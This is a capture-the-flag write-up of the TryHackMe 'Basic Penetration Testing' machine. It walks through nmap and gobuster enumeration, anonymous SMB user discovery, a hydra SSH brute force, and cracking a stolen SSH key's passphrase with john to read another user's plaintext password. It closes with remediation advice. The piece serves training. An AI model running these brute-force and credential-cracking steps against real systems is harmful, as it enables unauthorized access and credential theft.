# Basic Penetration Testing

**Author:** Alexis Sanchez **Date:** September 17, 2026 **Difficulty:** Easy **Operating System:** Linux

## Machine Image

![Machine Image](./Images/machine.jpg)

## Introduction

### TL;DR

Initial access was obtained as `jan` via SSH brute force, after enumerating valid users through an exposed anonymous SMB share. Privilege escalation to `kay` was achieved by exploiting a private SSH key with a weak passphrase, located in a misconfigured backup file (`pass.bak`), ultimately obtaining the flag and `kay`'s plaintext password.

### Context

TryHackMe Basic Penetration Testing | John Hammond • Aug 19, 2020

List of activities to follow:

- Brute Force
- Crack Hashing
- Service enumeration
- Linux enumeration

The goal of the machine is to understand as much as possible.

## Initial Reconnaissance

> Note: the victim machine's IP changed between sessions (the VM was restarted several times during the exercise). All references are normalized to `<TARGET_IP>`.

### Port Scan

We started with a full nmap scan to identify exposed services:

```bash
nmap -Pn -p- --open -sS --min-rate 5000 -vvv -n <TARGET_IP>
```

### Service Scan

```bash
nmap -Pn -p -sC <OPEN_TARGET_PORT>
```

### Service Enumeration — answering "Find the services exposed by the machine"

```
nmap -Pn -p 22,80,139,445,8009,8080 -sC <TARGET_IP>

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-22 19:46 CST

Nmap scan report for <TARGET_IP>

Host is up (0.092s latency).

PORT STATE SERVICE

22/tcp open ssh

| ssh-hostkey:

| 3072 e4:32:2f:ce:b2:ae:12:f3:66:38:8b:2b:21:7b:0d:01 (RSA)

| 256 7b:d9:5c:a8:dd:f8:48:b9:a5:29:9b:29:af:c2:85:e4 (ECDSA)

|_ 256 c2:9b:1b:19:df:f2:82:db:da:4c:19:30:22:20:fa:f1 (ED25519)

80/tcp open http

|_http-title: Site doesn't have a title (text/html).

139/tcp open netbios-ssn

445/tcp open microsoft-ds

8009/tcp open ajp13

| ajp-methods:

|_ Supported methods: GET HEAD POST OPTIONS

8080/tcp open http-proxy

|_http-favicon: Apache Tomcat

|_http-title: Apache Tomcat/9.0.7

Host script results:

| smb2-time:

| date: 2026-09-23T01:46:42

|_ start_date: N/A

| smb2-security-mode:

| 3:1:1:

|_ Message signing enabled but not required

|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Nmap done: 1 IP address (1 host up) scanned in 33.34 seconds
```

### First look at the website

*(Machine image and website screenshot omitted from this translated copy — available in the original document.)*

## Web Enumeration

### Directory discovery — answering "What is the name of the hidden directory on the web server?"

**Directories found:**

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

Answer:

- development (Status: 301) \[Size: 318\]

### Checking /development

Two `.txt` files were found:

**dev.txt**

```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

**j.txt**

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

These notes already give an important clue: the initials **J** and **K** probably correspond to real users on the system.

## User brute-forcing to find the username & password

### SMB

Checking SMB in anonymous mode:

```bash
└─$ smbclient -L //<IP_TARGET> -N

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server <IP_TARGET> (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

(The SMB1 negotiation fails due to protocol incompatibility with the server — it does not affect enumeration over Anonymous.)

**Browsing the Anonymous share**

```bash
smbclient //<IP_TARGET>/Anonymous -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 12:31:20 2018
  ..                                  D        0  Thu Apr 19 12:13:06 2018
  staff.txt                           N      173  Thu Apr 19 12:29:55 2018

                14282840 blocks of size 1024. 6245848 blocks available
smb: \> get staff.txt 
getting file \staff.txt of size 173 as staff.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> ^C

```

```bash
cat staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

This confirms that the initials **J** and **K** found in `/development` correspond to users **Jan** and **Kay**. Validated with `enum4linux`:

```
enum4linux -a <IP_TARGET>
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''  
                                                                             
S-1-22-1-1000 Unix User\kay (Local User)                                     
S-1-22-1-1001 Unix User\jan (Local User)
```

### SSH Brute Force

Using the user jan:

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>

22][ssh] host: <IP_TARGET>   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
```

## Obtaining the Flag

### False positives

During privilege enumeration with LinPEAS, several possible escalation vectors appeared, mainly kernel vulnerabilities, `pkexec`, LXD, and other SUID binaries.

However, after manually reviewing each case, several turned out to be **false positives or not applicable to the system's configuration**. For example, `jan` did not belong to the `lxd` group, `sudo` was not permitted, and the installed version of `policykit-1` already had the patch corresponding to PwnKit.

After ruling out these vectors, I continued enumerating other users' directories.

### Checking the users directory

```
jan@ip-<TARGET_IP>:~$ cd ../
jan@ip-<TARGET_IP>:/home$ ls
jan  kay  ubuntu
```

We found the other user.

**Checking kay's user:**

```
jan@ip-<TARGET_IP>:/home$ cd kay/
jan@ip-<TARGET_IP>/home/kay$ ls
pass.bak
jan@ip-<TARGET_IP>:/home/kay$ cat pass.bak 
cat: pass.bak: Permission denied
jan@ip-<TARGET_IP>:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Sep 28 15:27 ..
-rw------- 1 kay  kay   789 Jun 22  2025 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
```

`pass.bak` is not directly accessible, but the `.ssh` directory is:

### Checking .ssh

```
jan@ip-<TARGET_IP>:/home/kay$ cd .ssh/
jan@ip-<TARGET_IP>:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
```

### Cracking id\_rsa

The contents of `id_rsa` are copied to the attacker machine for cracking. First, it's converted into a format readable by John:

```
└─$ python /usr/share/john/ssh2john.py id_rsa 
id_rsa: <CONTENT_HASH>
```

Cracking the password with john:

```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2026-09-28 22:08) 1.515g/s 125357p/s 125357c/s 125357C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### Logging in as kay and obtaining the flag

```
┌──(kali㉿Kali)-[~]
└─$ chmod 600 id_rsa 
                                                                             
┌──(kali㉿Kali)-[~]
└─$ ssh -i id_rsa kay@<TARGET_IP>
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 29 Sep 2026 12:21:39 AM EDT

  System load:  0.19               Processes:             117
  Usage of /:   50.6% of 13.62GB   Users logged in:       1
  Memory usage: 59%                IPv4 address for ens5: <TARGET_IP>
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sun Jun 22 13:40:04 2025 from <TARGET_IP>
kay@ip<TARGET_IP>:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$ 
```

Access obtained as `kay`, flag and plaintext password recovered.

## Final Summary

### Impact

The full compromise chain required no kernel exploit or complex vulnerability: it only took insecure default configuration (anonymous SMB allowing user enumeration) combined with weak, dictionary-reusable passwords. In a real environment, this represents a trivial initial access vector for an attacker with basic tools (`enum4linux`, `hydra`, `john`), and shows how a single forgotten backup file (`pass.bak`) can escalate the compromise from a low-privilege user to full access over another account.

### Remediation

- Disable or restrict anonymous access to SMB shares.
- Enforce a real password policy (not just communicate it, as seen in `j.txt`).
- Remove or properly encrypt backup files containing plaintext credentials.
- Protect private SSH keys with strong passphrases, outside of common wordlists like `rockyou.txt`.
- Periodically review sensitive file permissions in users' home directories.

### Lessons learned

- LinPEAS is a good starting point, but not everything it flags is exploitable — manually validating each vector (groups, sudoers, patched versions) avoids wasting time chasing false positives.
- User enumeration via SMB/`enum4linux` can be as valuable as a port scan: turning "initials in a `.txt`" into real users was the key piece for everything that followed.
- Reviewing seemingly harmless files in other users' directories (`pass.bak`, histories, configs) is often more productive than searching for sophisticated exploits.

### Conclusion

This machine is a good candidate for getting started in pentesting or reviewing fundamentals: it covers almost the entire basic cycle in a single exercise — reconnaissance, service enumeration, pivoting between users via leaked information, and privilege escalation without needing kernel exploits. It's especially useful for practicing the patience of reading scattered clues (names, initials, backup files) and connecting the dots, a skill as important as technical tool proficiency.
